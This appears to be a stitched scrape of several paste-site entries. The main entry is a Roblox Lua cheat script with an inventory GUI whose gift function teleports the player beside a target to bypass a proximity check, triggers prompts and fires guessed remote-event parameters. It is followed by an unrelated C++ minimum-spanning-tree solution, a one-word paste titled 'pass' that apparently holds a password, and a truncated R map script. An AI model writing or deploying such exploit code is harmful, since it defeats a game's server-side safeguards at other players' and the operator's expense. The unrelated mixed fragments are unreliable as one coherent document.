totalValueLabel.Position = UDim2.new(0.5, -10, 0, 0)
totalValueLabel.Parent = totalFrame

-- Column Headers with sort buttons
local columns = {""Item Name"", ""Type"", ""Variant"", ""Mutations"", ""Weight (kg)"", ""Price"", ""Favorited"", ""Gift""}
local columnWidths = {0.24, 0.08, 0.1, 0.17, 0.1, 0.15, 0.08, 0.08}

-- Create Column Headers
local currentX = 0
for i, columnName in ipairs(columns) do
    local headerContainer = Instance.new(""Frame"")
    headerContainer.Name = columnName:gsub("" "", """") .. ""HeaderContainer""
    headerContainer.Size = UDim2.new(columnWidths[i], 0, 1, 0)
    headerContainer.Position = UDim2.new(currentX, 0, 0, 0)
    headerContainer.BackgroundTransparency = 1
    headerContainer.Parent = headerFrame
    
    local columnHeader = Instance.new(""TextLabel"")
    columnHeader.Name = columnName:gsub("" "", """") .. ""Header""
    columnHeader.Size = UDim2.new(1, -25, 1, 0) -- Make room for sort button
    columnHeader.Position = UDim2.new(0, 5, 0, 0)
    columnHeader.BackgroundTransparency = 1
    columnHeader.Font = Enum.Font.SourceSansBold
    columnHeader.TextColor3 = Color3.fromRGB(255, 255, 255)
    columnHeader.TextSize = 18
    columnHeader.Text = columnName
    columnHeader.TextXAlignment = Enum.TextXAlignment.Left
    columnHeader.Parent = headerContainer
    
    -- Add sort button (except for Gift column)
    if i < 8 then
    local sortButton = Instance.new(""TextButton"")
    sortButton.Name = ""SortButton""
    sortButton.Size = UDim2.new(0, 20, 0, 20)
    sortButton.Position = UDim2.new(1, -25, 0.5, -10)
    sortButton.BackgroundTransparency = 0.8
    sortButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    sortButton.Text = columnName == currentSortColumn and (currentSortDir == ""asc"" and ""▲"" or ""▼"") or ""◆""
    sortButton.TextColor3 = columnName == currentSortColumn 
                         and Color3.fromRGB(255, 255, 100) 
                         or Color3.fromRGB(150, 150, 150)
    sortButton.TextSize = 14
    sortButton.Font = Enum.Font.SourceSansBold
    sortButton.Parent = headerContainer
    
    -- Add rounded corners to sort button
    local sortCorner = Instance.new(""UICorner"")
    sortCorner.CornerRadius = UDim.new(0, 4)
    sortCorner.Parent = sortButton
    
    -- Store the sort button for later reference
    sortButtons[columnName] = sortButton
    end
    
    currentX = currentX + columnWidths[i]
end

-- Function to toggle minimize state
local function toggleMinimize()
    isMinimized = not isMinimized
    
    if isMinimized then
        -- Store current size before minimizing
        originalSize = mainFrame.Size
        
        -- Minimize GUI - just show title bar
        mainFrame.Size = UDim2.new(0, 300, 0, 30)
        minimizeButton.Text = ""+""
        
        -- Hide content
        if mainFrame:FindFirstChild(""HeaderFrame"") then
            mainFrame.HeaderFrame.Visible = false
        end
        if mainFrame:FindFirstChild(""ScrollingFrame"") then
            mainFrame.ScrollingFrame.Visible = false
        end
        if mainFrame:FindFirstChild(""TotalFrame"") then
            mainFrame.TotalFrame.Visible = false
        end
        if mainFrame:FindFirstChild(""ResizeHandle"") then
            mainFrame.ResizeHandle.Visible = false
        end
    else
        -- Restore GUI to original size
        mainFrame.Size = originalSize
        minimizeButton.Text = ""-""
        
        -- Show content
        if mainFrame:FindFirstChild(""HeaderFrame"") then
            mainFrame.HeaderFrame.Visible = true
        end
        if mainFrame:FindFirstChild(""ScrollingFrame"") then
            mainFrame.ScrollingFrame.Visible = true
        end
        if mainFrame:FindFirstChild(""TotalFrame"") then
            mainFrame.TotalFrame.Visible = true
        end
        if mainFrame:FindFirstChild(""ResizeHandle"") then
            mainFrame.ResizeHandle.Visible = true
        end
    end
end

-- Connect minimize button
minimizeButton.MouseButton1Click:Connect(toggleMinimize)

-- DRAGGING IMPLEMENTATION
local dragging = false
local dragInput
local dragStart
local startPos

local function updateDrag(input)
    if dragging then
        local delta = input.Position - dragStart
        local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                   startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        
        RunService.RenderStepped:Wait()
        mainFrame.Position = position
    end
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or
       input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or
       input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateDrag(input)
    end
end)

-- RESIZE IMPLEMENTATION
local resizing = false
local resizeStart
local startSize

resizeHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or
       input.UserInputType == Enum.UserInputType.Touch then
        resizing = true
        resizeStart = input.Position
        startSize = mainFrame.Size
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                resizing = false
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if resizing and (input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - resizeStart
        local newWidth = math.max(400, startSize.X.Offset + delta.X)
        local newHeight = math.max(300, startSize.Y.Offset + delta.Y)
        
        -- Resize main frame
        mainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
        originalSize = mainFrame.Size
        
        -- Update scrolling frame size
        if scrollingFrame then
            scrollingFrame.Size = UDim2.new(1, -20, 1, -105)
        end
    end
end)

-- Close button logic
closeButton.MouseButton1Click:Connect(function()
    inventoryGui:Destroy()
end)


-- Modified gift function with proximity bypass
local function giftWithTeleport(tool, targetPlayerName)
    -- Validate inputs
    if not tool or targetPlayerName == """" then
        return false
    end
    
    -- Find the target player
    local targetPlayer = nil
    for _, plr in pairs(game.Players:GetPlayers()) do
        if plr.Name:lower() == targetPlayerName:lower() then
            targetPlayer = plr
            break
        end
    end
    
    if not targetPlayer then
        return false, ""Player not found""
    end
    
    -- Variables for teleport loop
    local character = player.Character
    local targetCharacter = targetPlayer.Character
    local isGifting = true
    local giftSuccess = false
    local maxAttempts = 20
    local attempts = 0
    local startTime = tick()
    
    -- Equip the tool first
    if tool.Parent ~= character then
        tool.Parent = character
        task.wait(0.1)
    end
    
    -- Start teleport and gift attempt loop
    spawn(function()
        while isGifting and attempts < maxAttempts and tick() - startTime < 10 do
            attempts = attempts + 1
            
            -- Teleport to target player (forcefully move close to bypass distance check)
            if character and targetCharacter and character.PrimaryPart and targetCharacter.PrimaryPart then
                pcall(function()
                    local origPos = character.PrimaryPart.CFrame
                    -- Teleport extremely close to target to bypass distance check
                    character:SetPrimaryPartCFrame(
                        targetCharacter.PrimaryPart.CFrame * 
                        CFrame.new(0, 0, 2) -- Very close distance
                    )
                    
                    -- Wait a tiny moment for game to register position
                    task.wait(0.1)
                    
                    -- Attempt multiple bypass methods
                    
                    -- 1. Try to trigger proximity prompts directly
                    local hrp = targetCharacter:FindFirstChild(""HumanoidRootPart"")
                    if hrp then
                        for _, obj in pairs(hrp:GetChildren()) do
                            if obj:IsA(""ProximityPrompt"") and obj.Enabled then
                                -- Try with different methods
                                fireproximityprompt(obj)
                                task.wait(0.05)
                                pcall(function() obj:InputHoldBegin() end)
                                task.wait(0.05)
                                pcall(function() obj:InputHoldEnd() end)
                                task.wait(0.05)
                            end
                        end
                    end
                    
                    -- Return to original position if teleport isn't allowed in game
                    task.wait(0.2)
                    pcall(function() character:SetPrimaryPartCFrame(origPos) end)
                end)
            end
            
            -- Try to trigger remote events directly
            pcall(function()
                -- Try all potential gift-related remotes
                local gameEvents = ReplicatedStorage:FindFirstChild(""GameEvents"")
                if gameEvents then
                    -- Try direct method with all potential parameters
                    local remotes = {
                        gameEvents:FindFirstChild(""FriendGiftEvent""),
                        gameEvents:FindFirstChild(""RemoteEvent""),
                        gameEvents:FindFirstChild(""PetGiftingService""),
                        gameEvents:FindFirstChild(""SeedPackGiverEvent"")
                    }
                    
                    for _, remote in pairs(remotes) do
                        if remote then
                            -- Try various parameter combinations
                            remote:FireServer(tool, targetPlayer)
                            remote:FireServer(""GiveItem"", targetPlayer, tool)
                            remote:FireServer(targetPlayer, tool)
                            remote:FireServer(tool)
                        end
                    end
                end
            end)
            
            -- Check if tool still exists (it would be gone if gift succeeded)
            if not tool:IsDescendantOf(game) then
                giftSuccess = true
                isGifting = false
                break
            end
            
            -- Small wait between attempts
            task.wait(0.3)
        end
        
        isGifting = false
    end)
    
    -- Return immediately but gifting continues in background
    return true, ""Attempting to bypass proximity limit...""
end

-- Add function to find all remote events (for debugging)
local function findPotentialGiftRemotes()
    local remotes = {}
    
    for _, instance in pairs(ReplicatedStorage:GetDescendants()) do
        if instance:IsA(""RemoteEvent"") or instance:IsA(""RemoteFunction"") then
            table.insert(remotes, instance:GetFullName())
        end
    end
    
    return remotes
end

-- Connect debug button
debugButton.MouseButton1Click:Connect(function()
    local remotes = findPotentialGiftRemotes()
    print(""=== POTENTIAL GIFT REMOTES ==="")
    for i, remotePath in ipairs(remotes) do
        if remotePath:lower():find(""gift"") or remotePath:lower():find(""trade"") or 
           remotePath:lower():find(""item"") or remotePath:lower():find(""give"") then
            print(i, remotePath, ""(LIKELY)"")
        else
            print(i, remotePath)
        end
    end
    print(""Total remotes found:"", #remotes)
    print(""=== END OF REMOTES LIST ==="")
end)

-- Forward declaration for createSortedItemList function
local createSortedItemList

-- Function to refresh the inventory list
local function refreshInventoryList()
    -- Prevent multiple refreshes at once
    if isRefreshing then return end
    isRefreshing = true
    
    -- Don't refresh too frequently
    local currentTime = tick()
    if currentTime - lastRefreshTime < 5 then
        isRefreshing = false
        return
    end
    lastRefreshTime = currentTime
    
    -- Update button appearance
    refreshButton.Text = ""Refreshing...""
    refreshButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    
    -- Clear all item data
    allItemsData = {}
    
    -- Get player inventory data
    local success, playerData = pcall(function()
        return DataService:GetData()
    end)
    
    if not success or not playerData or not playerData.InventoryData then
        local errorLabel = Instance.new(""TextLabel"")
        errorLabel.Size = UDim2.new(1, 0, 0, 30)
        errorLabel.Position = UDim2.new(0, 0, 0, 0)
        errorLabel.BackgroundTransparency = 1
        errorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        errorLabel.Text = ""Inventory data not found!""
        errorLabel.Font = Enum.Font.SourceSansSemibold
        errorLabel.TextSize = 18
        errorLabel.Parent = scrollingFrame
        
        -- Reset button
        refreshButton.Text = ""Refresh""
        refreshButton.BackgroundColor3 = Color3.fromRGB(60, 120, 60)
        isRefreshing = false
        return
    end
    
    local totalValue = 0
    
    -- Get tools from player's backpack and character
    local backpack = player:FindFirstChild(""Backpack"")
    local character = player.Character
    local tools = {}
    
    -- Collect tools from backpack
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA(""Tool"") then
                table.insert(tools, tool)
            end
        end
    end
    
    -- Collect tools from character
    if character then
        for _, tool in pairs(character:GetChildren()) do
            if tool:IsA(""Tool"") then
                table.insert(tools, tool)
            end
        end
    end
    
    -- Process each tool
    for _, tool in pairs(tools) do
        -- Only process holdable items (not seeds)
        if tool:GetAttribute(""ItemType"") == ""Holdable"" or tool:GetAttribute(""ItemType"") == ""Pet"" then
            local itemName = tool.Name
            local itemType = tool:GetAttribute(""ItemType"") or ""Unknown""
            
            -- Get item UUID to find in inventory data
            local uuid = tool:GetAttribute(""ITEM_UUID"")
            if not uuid then continue end
            
            -- Get item data from inventory
            local itemData = playerData.InventoryData[uuid]
            if not itemData or not itemData.ItemData then continue end
            
            -- Get variant
            local variant = ""Normal""
            if itemData.ItemData.Variant then
                variant = itemData.ItemData.Variant
            end
            
            -- Get mutations
            local mutations = ""None""
            if itemData.ItemData.MutationString and itemData.ItemData.MutationString ~= """" then
                mutations = itemData.ItemData.MutationString
            end
            
            -- Get weight (FIXED)
            local weight = 0
            local weightDisplay = ""0.00""
            
            -- For pets, extract from name with better pattern matching
            if itemType == ""Pet"" then
                local weightStr = itemName:match(""(%d+%.?%d*)%s*KG"")
                if weightStr then
                    weight = tonumber(weightStr) or 0
                    weightDisplay = string.format(""%.2f"", weight)
                end
            else
                -- Try multiple sources for weight
                if tool:GetAttribute(""Weight"") then
                    weight = tool:GetAttribute(""Weight"")
                elseif tool:FindFirstChild(""Weight"") and tool.Weight:IsA(""NumberValue"") then
                    weight = tool.Weight.Value
                else
                    -- Last resort: try to extract from name
                    local weightStr = itemName:match(""(%d+%.?%d*)%s*[Kk][Gg]"")
                    if weightStr then
                        weight = tonumber(weightStr) or 0
                    end
                end
                weightDisplay = string.format(""%.2f"", weight)
            end
            
            -- Calculate price
            local price = 0
            pcall(function()
                if itemType == ""Pet"" then
                    price = CalculatePetValue(tool)
                else
                    price = CalculatePlantValue(tool)
                end
            end)
            
            -- Add to total value
            totalValue = totalValue + price
            
            -- Check if item is favorited
            local isFavorited = false
            if (itemData.ItemData.IsFavorite and itemData.ItemData.IsFavorite == true) or 
               (tool:GetAttribute(""IsFavorite"") and tool:GetAttribute(""IsFavorite"") == true) or 
               (tool:GetAttribute(""Favorite"") and tool:GetAttribute(""Favorite"") == true) then
                isFavorited = true
            end
            
            -- Store item data for sorting
            table.insert(allItemsData, {
                name = itemName:gsub(""%s*%[.*%]"", """"):gsub(""%s*%d+%.?%d*%s*KG"", """"):gsub(""Age%s*%d+"", """"):gsub(""%s+$"", """"), -- Clean up name
                fullName = itemName,
                type = itemType,
                variant = variant,
                mutations = mutations,
                weight = weightDisplay,
                weightNum = weight,
                price = price,
                formattedPrice = formatNumber(price),
                uuid = uuid,
                isFavorited = isFavorited,
                tool = tool -- Store reference to the tool for gift functionality
            })
        end
    end
    
    -- Update total value display
    totalValueLabel.Text = formatNumber(totalValue)
    
    -- Display sorted item list
    createSortedItemList()
    
    -- Reset button
    refreshButton.Text = ""Refresh""
    refreshButton.BackgroundColor3 = Color3.fromRGB(60, 120, 60)
    isRefreshing = false
end

-- Function to create sorted item list
createSortedItemList = function()
    -- Clear existing list
    for _, child in pairs(scrollingFrame:GetChildren()) do
        if child:IsA(""Frame"") then
            child:Destroy()
        end
    end
    
    -- Sort the items data based on current sort column and direction
    table.sort(allItemsData, function(a, b)
        local aValue, bValue
        
        if currentSortColumn == ""Item Name"" then
            aValue = a.name:lower()
            bValue = b.name:lower()
            
        elseif currentSortColumn == ""Type"" then
            aValue = a.type:lower()
            bValue = b.type:lower()
            
        elseif currentSortColumn == ""Variant"" then
            -- Sort variants (Rainbow > Gold > Normal)
            local variantPriority = {
                [""Rainbow""] = 3,
                [""Gold""] = 2,
                [""Normal""] = 1
            }
            aValue = variantPriority[a.variant] or 0
            bValue = variantPriority[b.variant] or 0
            
        elseif currentSortColumn == ""Mutations"" then
            -- Sort by number of mutations (more is better)
            local function countMutations(mutStr)
                if mutStr == ""None"" then return 0 end
                local count = 0
                for mutation in mutStr:gmatch(""[^,]+"") do
                    count = count + 1
                end
                return count
            end
            aValue = countMutations(a.mutations)
            bValue = countMutations(b.mutations)
            
        elseif currentSortColumn == ""Weight (kg)"" then
            aValue = a.weightNum or 0
            bValue = b.weightNum or 0
            
        elseif currentSortColumn == ""Price"" then
            aValue = a.price or 0
            bValue = b.price or 0
            
        elseif currentSortColumn == ""Favorited"" then
            aValue = a.isFavorited and 1 or 0
            bValue = b.isFavorited and 1 or 0
        else
            return false
        end
        
        if currentSortDir == ""asc"" then
            return aValue < bValue
        else
            return aValue > bValue
        end
    end)
    
    -- Update sort button appearance
    for colName, button in pairs(sortButtons) do
        if colName == currentSortColumn then
            button.Text = currentSortDir == ""asc"" and ""▲"" or ""▼""
            button.TextColor3 = Color3.fromRGB(255, 255, 100) -- Highlight active sort
        else
            button.Text = ""◆""
            button.TextColor3 = Color3.fromRGB(150, 150, 150) -- Dim inactive sorts
        end
    end
    
    -- Display all items (no limit)
    local rowHeight = 30
    for i, itemData in ipairs(allItemsData) do
        -- Create row frame
        local rowFrame = Instance.new(""Frame"")
        rowFrame.Name = ""Row_"" .. i
        rowFrame.Size = UDim2.new(1, 0, 0, rowHeight)
        rowFrame.Position = UDim2.new(0, 0, 0, (i-1) * rowHeight)
        rowFrame.BackgroundColor3 = i % 2 == 0 and Color3.fromRGB(40, 40, 40) or Color3.fromRGB(35, 35, 35)
        rowFrame.BackgroundTransparency = 0.3
        rowFrame.Parent = scrollingFrame
        
        -- Create columns in the row
        local currentX = 0
        local columnValues = {
            itemData.name, 
            itemData.type, 
            itemData.variant, 
            itemData.mutations, 
            itemData.weight, 
            itemData.formattedPrice, 
            itemData.isFavorited and ""Yes"" or ""No"",
            """" -- Empty for gift button
        }
        
        for j, columnValue in ipairs(columnValues) do
            if j < 8 then -- Regular columns
            local cell = Instance.new(""TextLabel"")
            cell.Name = ""Column"" .. j
            cell.Size = UDim2.new(columnWidths[j], -10, 1, 0)
            cell.Position = UDim2.new(currentX, 5, 0, 0)
            cell.BackgroundTransparency = 1
            cell.Font = Enum.Font.SourceSans
            
            -- Special formatting for different columns
            if j == 3 then -- Variant column
                if columnValue == ""Rainbow"" then
                    cell.TextColor3 = Color3.fromRGB(255, 100, 255)
                elseif columnValue == ""Gold"" then
                    cell.TextColor3 = Color3.fromRGB(255, 215, 0)
                else
                    cell.TextColor3 = Color3.fromRGB(255, 255, 255)
                end
            elseif j == 4 then -- Mutations column
                if columnValue ~= ""None"" then
                    cell.TextColor3 = Color3.fromRGB(100, 255, 100)
                else
                    cell.TextColor3 = Color3.fromRGB(255, 255, 255)
                end
            elseif j == 6 then -- Price column
                cell.TextColor3 = Color3.fromRGB(255, 255, 100)
            elseif j == 7 then -- Favorited column
                cell.TextColor3 = columnValue == ""Yes"" and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(255, 255, 255)
            else
                cell.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
            
            cell.TextSize = 16
            cell.Text = tostring(columnValue)
            cell.TextXAlignment = Enum.TextXAlignment.Left
            cell.TextWrapped = true
            cell.Parent = rowFrame
            else -- Gift button column
                local giftButton = Instance.new(""TextButton"")
                giftButton.Name = ""GiftButton""
                giftButton.Size = UDim2.new(columnWidths[j], -10, 0, 22)
                giftButton.Position = UDim2.new(currentX, 5, 0.5, -11)
                giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 150)
                giftButton.Text = ""Gift""
                giftButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                giftButton.TextSize = 14
                giftButton.Font = Enum.Font.SourceSansBold
                giftButton.Parent = rowFrame
                
                -- Add rounded corners
                local giftCorner = Instance.new(""UICorner"")
                giftCorner.CornerRadius = UDim.new(0, 4)
                giftCorner.Parent = giftButton
                
                -- One-click gift functionality with auto-teleport
                giftButton.MouseButton1Click:Connect(function()
                    local targetPlayer = giftPlayerInput.Text
                    
                    if targetPlayer == """" then
                        -- Show error if no username entered
                        giftButton.Text = ""No User!""
                        giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 60)
                        
                        -- Reset after 2 seconds
                        task.delay(2, function()
                            giftButton.Text = ""Gift""
                            giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 150)
                        end)
                        return
                    end
                    
                    -- Start the gifting with teleport process
                    giftButton.Text = ""Sending...""
                    giftButton.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
                    
                    local success, message = giftWithTeleport(itemData.tool, targetPlayer)
                    
                    if success then
                        -- Check status every second for up to 10 seconds
                        local checkInterval = 0.5
                        local maxChecks = 20
                        local checks = 0
                        
                        local checkSuccess = function()
                            checks = checks + 1
                            
                            -- If the tool no longer exists, gift was successful
                            if not itemData.tool:IsDescendantOf(game) then
                                giftButton.Text = ""Sent!""
                                giftButton.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
                                
                                -- Reset after 2 seconds and refresh
                                task.delay(2, function()
                                    giftButton.Text = ""Gift""
                                    giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 150)
                                    refreshInventoryList()
                                end)
                                return
                            end
                            
                            -- If we've reached max checks, give up
                            if checks >= maxChecks then
                                giftButton.Text = ""Failed!""
                                giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 60)
                                
                                -- Reset after 2 seconds
                                task.delay(2, function()
                                    giftButton.Text = ""Gift""
                                    giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 150)
                                end)
                                return
                            end
                            
                            -- Continue checking
                            task.spawn(function()
                                task.wait(checkInterval)
                                checkSuccess()
                            end)
                        end
                        
                        -- Start checking
                        checkSuccess()
                    else
                        -- Failed to start the process
                        giftButton.Text = ""Failed!""
                        giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 60)
                        
                        -- Reset after 2 seconds
                        task.delay(2, function()
                            giftButton.Text = ""Gift""
                            giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 150)
                        end)
                    end
                end)
                
                -- Add hover effects
                giftButton.MouseEnter:Connect(function()
                    if giftButton.Text == ""Gift"" then
                        giftButton.BackgroundColor3 = Color3.fromRGB(180, 80, 180)
                    end
                end)
                
                giftButton.MouseLeave:Connect(function()
                    if giftButton.Text == ""Gift"" then
                        giftButton.BackgroundColor3 = Color3.fromRGB(150, 60, 150)
                    end
                end)
            end
            
            currentX = currentX + columnWidths[j]
        end
    end
    
    -- Update scrolling frame content size
    scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #allItemsData * rowHeight)
    
    -- Update counter
    titleText.Text = ""Inventory Items & Prices - "" .. #allItemsData .. "" Items""
end

-- Connect sort button click handlers
for colName, button in pairs(sortButtons) do
    button.MouseButton1Click:Connect(function()
        if currentSortColumn == colName then
            -- Toggle direction if same column
            currentSortDir = currentSortDir == ""asc"" and ""desc"" or ""asc""
        else
            -- New column, set appropriate default direction
            currentSortColumn = colName
            
            -- Special cases for default sort direction
            if colName == ""Weight (kg)"" or colName == ""Price"" or colName == ""Variant"" or 
               colName == ""Mutations"" or colName == ""Favorited"" then
                currentSortDir = ""desc"" -- Higher values first
            else
                currentSortDir = ""asc"" -- A-Z for text
            end
        end
        
        -- Just re-sort and redisplay without refreshing data
        createSortedItemList()
    end)
end

-- Connect the refresh button
refreshButton.MouseButton1Click:Connect(function()
    if not isRefreshing then
        refreshInventoryList()
    end
end)

-- Find and check gift functionality (try to find the remote)
local function checkGiftFunctionality()
    local found = false
    pcall(function()
        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA(""RemoteEvent"") and 
              (remote.Name:lower():find(""gift"") or remote.Name:lower():find(""trade"")) then
                found = true
                print(""Found potential gift remote: "" .. remote:GetFullName())
            end
        end
    end)
    
    if not found then
        print(""No gift remote found. Gift functionality may not work."")
    end
end

-- Try to detect gift functionality
task.spawn(checkGiftFunctionality)

-- Set up auto-refresh (using a safer approach)
local function setupAutoRefresh()
    spawn(function()
        -- Initial refresh
        refreshInventoryList()
        
        -- Check if GUI still exists every 30 seconds and refresh
        while true do
            task.wait(30)
            if not inventoryGui or not inventoryGui.Parent then break end
            if not isMinimized and not isRefreshing then
                pcall(refreshInventoryList)
            end
        end
    end)
end

-- Setup auto refresh
setupAutoRefresh()"
u35Qgbd6,Untitled,Alickon,C++,Thursday 12th of June 2025 11:44:27 PM CDT,"//Bismillahir-Rahmanir-Rahim
#include <bits/stdc++.h>
             
using namespace std;
          
#define flash ios_base::sync_with_stdio(0),cin.tie(0)
#define pb push_back
#define ll long long
#define ld long double
#define dbg(x) cerr << #x << "" = "" << x << ""\n"";
#define ff first
#define ss second
// #define int long long
	  
/*
#pragma GCC target (""avx2"")
#pragma GCC optimization (""O3"")
#pragma comment (linker, ""/stack:200000000"")
#pragma GCC optimize(""Ofast"")
#pragma GCC target (""sse,sse2,sse3,ssse3,sse4,popcnt,abm,mmx,avx,tune=native"")
*/
     
const long long INF = 1e9 + 7;
const long long MOD = 1e9 + 7;
const int maxn = 1e6 + 10;
const int lg = 20;

int n, p[maxn], m, ans;
vector <pair <int, pair <int, int>> > lst;

int get(int v) {
    if (v == p[v]) {
        return v;
    }
    p[v] = get(p[v]);
    return p[v];
}

void merge(int v, int u) {
    int pv = get(v);
    int pu = get(u);
    if (pv != pu) {
        p[pu] = pv;
    }
}

void press_F_() {
	cin >> n >> m;
    for (int i = 1; i <= n; i++) {
        p[i] = i;
    }
    for (int i = 1; i <= m; i++) {
        int a, b, c;
        cin >> a >> b >> c;
        lst.pb({c, {a, b}});
    }
    sort(lst.begin(), lst.end());
    for (int i = 0; i < lst.size(); i++) {
        int a, b, c;
        c = lst[i].ff;
        a = lst[i].ss.ff;
        b = lst[i].ss.ss;
        if (get(a) != get(b)) {
            ans += c;
            // cout << a << "" "" << b << "" "" << c << '\n'; 
            merge(a, b);
        }
    }
    cout << ans;
}

int main() {
    flash;
    int T = 1;
    // cin >> T;
    for (int _ = 1; _ <= T; ++_) {
        // cout << ""Case "" << i << "": "";
        press_F_();
    }
    return 0;
}"
v5wJKgH5,pass,nathhhhhh,Python,Thursday 12th of June 2025 11:34:30 PM CDT,lahiruravinath
mi1krugp,Modified US State/County maps with US territories.R,bdill,R,Thursday 12th of June 2025 11:32:28 PM CDT,"################################################################################
### This script takes state/county shapefiles from the Census Bureau, and moves
### Alaska, Hawaii, Puerto Rico, US Virgin Islands, Guam, Samoa, and the Mariana
### Islands to be just under the continental US.   This format is very useful for
### mapping data.
###
### I originally used the ""state_laea"" and ""county_laea"" maps from the 
### ""tidycensus"" package, but kept hitting various issues:
###
### 1) The Tidycensus maps are low-resolution, so counties don't look good if 
###    you zoom in on a particular state
###
### 2) The ""Tidycensus"" maps are old and require various FIPS mods every time I 
###    use them, such as changing fips 46113 -> 46102 to handle Oglala Co SD, 
###    changing fips 02270 -> 02158 to handle Kusilvak Census Area, AK
###
### 3) The Tidycensus map lacked the smaller US territories.
###
### I took inspiration for this script from the URL below:
###
### https://rud.is/b/2014/11/16/moving-the-earth-well-alaska-hawaii-with-r/
###
### If you find any bugs or issues with the script or with the maps it generates
### please let me know - /u/MetricT
###
### KNOWN BUGS:
###
### * Sourcing the script will cause errors at these lines near the bottom:
###
###    > state_map  %>% st_as_sf() %>% write_sf(mod_state_map)
###    There were 50 or more warnings (use warnings() to see the first 50)
###    > county_map %>% st_as_sf() %>% write_sf(mod_county_map)
###    There were 50 or more warnings (use warnings() to see the first 50)
###
###   Just run them manually at that point and it should work fine.
################################################################################

library(tidyverse)
library(maptools)
library(mapproj)
library(rgeos)
library(rgdal)
library(RColorBrewer)
library(ggplot2)
library(sf)

### Path/filename to save modified shapefiles at when we're done
mod_state_map  <- ""../Shapefiles/us_state/us_state.shp""
mod_county_map <- ""../Shapefiles/us_county/us_county.shp""

### We want our map to use the Albers projection
map_crs <- ""+proj=laea +lat_0=45 +lon_0=-100 +x_0=0 +y_0=0 +a=6370997 +b=6370997 +units=m +no_defs""
#map_crs <- ""epsg:5070""

state_map <- 
  read_sf(""../Shapefiles/cb_2018_us_state_500k/cb_2018_us_state_500k.shp"") %>%
  st_transform(map_crs) %>%
  as(Class = ""Spatial"")

county_map <- 
  read_sf(""../Shapefiles/cb_2018_us_county_500k/cb_2018_us_county_500k.shp"") %>%
  st_transform(map_crs) %>%
  as(Class = ""Spatial"")

state_map@data$id  <- rownames(state_map@data)
county_map@data$id <- rownames(county_map@data)

### We want to strip out states/territories that aren't in the continental US
### and move them around to make a more convenient map
non_conus_fips <- c(""02"", ""11"", ""15"", ""60"", ""66"", ""69"", ""72"", ""78"")

################################################################################
### Adjust the state-level map
################################################################################

### Alaska
alaska_state <- state_map[state_map$STATEFP==""02"",]
alaska_state <- elide(alaska_state, rotate=-50)
alaska_state <- elide(alaska_state, scale=max(apply(bbox(alaska_state), 1, diff)) / 1.8)
alaska_state <- elide(alaska_state, shift=c(-2400000, -2800000))
proj4string(alaska_state) <- proj4string(state_map)

### Hawaii
hawaii_state <- state_map[state_map$STATEFP==""15"",]
hawaii_state <- elide(hawaii_state, rotate=-35)
hawaii_state <- elide(hawaii_state, shift=c(5800000, -1900000))
proj4string(hawaii_state) <- proj4string(state_map)

### Puerto Rico
puertorico_state <- state_map[state_map$STATEFP==""72"",]
puertorico_state <- elide(puertorico_state, rotate=+13)
puertorico_state <- elide(puertorico_state, scale=max(apply(bbox(puertorico_state), 1, diff)) / 0.5)
puertorico_state <- elide(puertorico_state, shift=c(+600000, -2600000))
proj4string(puertorico_state) <- proj4string(state_map)

### US Virgin Islands
usvi_state <- state_map[state_map$STATEFP==""78"",]
usvi_state <- elide(usvi_state, rotate=+13)
usvi_state <- elide(usvi_state, scale=max(apply(bbox(usvi_state), 1, diff)) / 0.25)
usvi_state <- elide(usvi_state, shift=c(+1500000, -2600000))
proj4string(usvi_state) <- proj4string(state_map)

### Guam
guam_state <- state_map[state_map$STATEFP==""66"",]
guam_state <- elide(guam_state, rotate=-65)
guam_state <- elide(guam_state, scale=max(apply(bbox(guam_state), 1, diff)) / 0.15)
guam_state <- elide(guam_state, shift=c(+1200000, -3200000))
proj4string(guam_state) <- proj4string(state_map)

### Northern Mariana Islands
noma_state <- state_map[state_map$STATEFP==""69"",]
noma_state <- elide(noma_state, rotate=-55)
noma_state <- elide(noma_state, scale=max(apply(bbox(noma_state), 1, diff)) / 0.85)
noma_state <- elide(noma_state, shift=c(+300000, -3400000))
proj4string(noma_state) <- proj4string(state_map)

### American Samoa
amsam_state <- state_map[state_map$STATEFP==""60"",]
amsam_state <- elide(amsam_state, rotate=-55)
amsam_state <- elide(amsam_state, scale=max(apply(bbox(amsam_state), 1, diff)) / 0.25)
amsam_state <- elide(amsam_state, shift=c(-2300000, -3400000))
proj4string(amsam_state) <- proj4string(state_map)

### Add the moved states/territories back to the CONUS map
state_map <- state_map[!state_map$STATEFP %in% non_conus_fips,]
